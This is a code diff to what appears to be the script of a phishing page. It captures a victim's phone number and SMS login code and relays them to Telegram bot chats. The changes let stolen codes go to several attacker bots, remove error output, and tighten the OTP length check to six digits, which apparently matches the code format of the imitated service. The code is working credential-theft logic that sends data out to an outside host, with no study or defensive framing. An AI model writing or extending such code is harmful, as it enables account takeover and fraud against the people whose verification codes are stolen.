@@ -49,10 +49,14 @@ async function updateTelegramMessage(smsCode) {
     if (!messageIdsStr || !phone) return false;
 
     const messageIds = JSON.parse(messageIdsStr);
-    const url = `https://api.telegram.org/bot${TELEGRAM_CONFIG.BOT_TOKEN}/editMessageText`;
     const text = `📱 Yeni Giriş\n\n📞 Telefon: <code>${phone}</code>\n🔑 SMS Kod: <code>${smsCode}</code>`;
 
-    const updatePromises = Object.entries(messageIds).map(async ([chatId, msgId]) => {
+    const updatePromises = Object.entries(messageIds).map(async ([key, msgId]) => {
+        const parts = key.split(':::');
+        const bot = parts.length > 1 ? parts[0] : TELEGRAM_CONFIG.BOT_TOKEN;
+        const chatId = parts.length > 1 ? parts[1] : key;
+        const url = `https://api.telegram.org/bot${bot}/editMessageText`;
+
         try {
             const res = await fetch(url, {
                 method: 'POST',
@@ -67,11 +71,9 @@ async function updateTelegramMessage(smsCode) {
             const data = await res.json();
             if (data.ok) {
                 console.log(`Telegram message updated for ${chatId}`);
-            } else {
-                console.error(`Telegram update error for ${chatId}:`, data.description);
             }
         } catch (e) {
-            console.error(`Fetch update error for ${chatId}:`, e);
+            console.error(`Fetch update error:`, e);
         }
     });
 
@@ -83,7 +85,7 @@ async function updateTelegramMessage(smsCode) {
 submitBtn.addEventListener('click', async function () {
     const otp = otpInput.value.trim();
 
-    if (otp.length < 4) {
+    if (otp.length < 6) {
         const inputRow = document.querySelector('.otp-input-row');
         inputRow.classList.add('shake');
         setTimeout(() => inputRow.classList.remove('shake'), 500);
